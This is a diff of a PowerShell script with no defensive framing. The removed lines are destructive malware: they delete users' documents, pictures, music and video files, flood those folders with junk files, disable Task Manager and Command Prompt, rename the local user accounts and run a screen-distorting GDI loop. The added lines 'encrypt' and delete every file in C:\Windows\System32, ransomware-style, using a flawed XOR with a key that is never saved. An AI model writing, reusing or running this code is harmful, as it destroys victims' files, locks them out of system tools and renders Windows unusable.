@@ -1,109 +1,23 @@
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$documentsPath = [Environment]::GetFolderPath("MyDocuments")
-$musicPath = [Environment]::GetFolderPath("MyMusic")
-$picturesPath = [Environment]::GetFolderPath("MyPictures")
-$videosPath = [Environment]::GetFolderPath("MyVideos")
+# Encrypt files in System32 using a random key
+$directory = "C:\Windows\System32"
 
-$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
+# Generate a random encryption key
+$key = [System.Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 }))
 
-$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
-
-foreach ($path in $pathsToDelete) {
-    foreach ($extension in $extensionsToDelete) {
-        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
-
-        foreach ($file in $filesToDelete) {
-            $filePath = $file.FullName
-            Write-Host "Deleting file: $filePath"
-            Remove-Item -Path $filePath -Force
-        }
-    }
-
-    for ($i = 1; $i -le 999; $i++) {
-        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
-        $newFileName = ".....⓿⌓⓿....._$randomIteration.txt"
-        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
-        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
+# Encrypt files in the directory and its subdirectories
+Get-ChildItem -Path $directory -File -Recurse | ForEach-Object {
+    $filePath = $_.FullName
+    Write-Host "Encrypting file: $filePath"
+    try {
+        $encryptedFile = $filePath + ".encrypted"
+        $encryptedFileBytes = Get-Content -Path $filePath -Encoding Byte
+        $encryptedFileBytes | ForEach-Object {
+            $_ -bxor $key
+        } | Set-Content -Path $encryptedFile -Encoding Byte
+        Remove-Item -Path $filePath
+    } catch {
+        Write-Host "Error encrypting file: $filePath"
     }
 }
 
-# Create registry key to disable Task Manager
-$disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-New-Item -Path $disableTaskMgrPath -Force | Out-Null
-Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
-
-# Create registry key to disable Command Prompt
-$disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
-New-Item -Path $disableCmdPath -Force | Out-Null
-Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
-
-# Create registry key to disable Search Bar in taskbar
-$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
-New-Item -Path $searchBarPath -Force | Out-Null
-Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
-
-# Change the user account names
-$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
-foreach ($user in $users) {
-    $newName = "⓿⌓⓿"
-    Rename-LocalUser -Name $user.Name -NewName $newName
-}
-
-# Create registry key to enable Command Prompt on restart or shutdown
-$enableCmdOnRestartPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-Set-ItemProperty -Path $enableCmdOnRestartPath -Name "DisableCMD" -Value 0
-
-$source = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Threading;
-
-public static class Win32
-{
-    [DllImport("user32.dll")]
-    static extern int GetSystemMetrics(int smIndex);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetDC(IntPtr hWnd);
-
-    [DllImport("gdi32.dll")]
-    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    static extern bool SetProcessDPIAware();
-
-    [DllImport("gdi32.dll")]
-    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
-
-    [DllImport("gdi32.dll")]
-    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);
-
-    public static void ReversePIP()
-    {
-        SetProcessDPIAware();
-        int cx = GetSystemMetrics(0);
-        int cy = GetSystemMetrics(1);
-
-        while (true)
-        {
-            Thread.Sleep(800);
-            IntPtr hdc = GetDC(IntPtr.Zero);
-
-            // StretchBlt for Reverse PIP
-            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);
-
-            // BitBlt for Inverting Colors
-            //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);
-
-            // TransparentBlt for Transparency
-            //TransparentBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, cx, cy, 0xFF0000);
-
-            // BitBlt with Raster Operation (ROP) Code for XOR Effect
-            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
-        }
-    }
-}
-"@
-
-Add-Type -TypeDefinition $source -Language CSharp
-[Win32]::ReversePIP()
+Write-Host "Encryption complete."
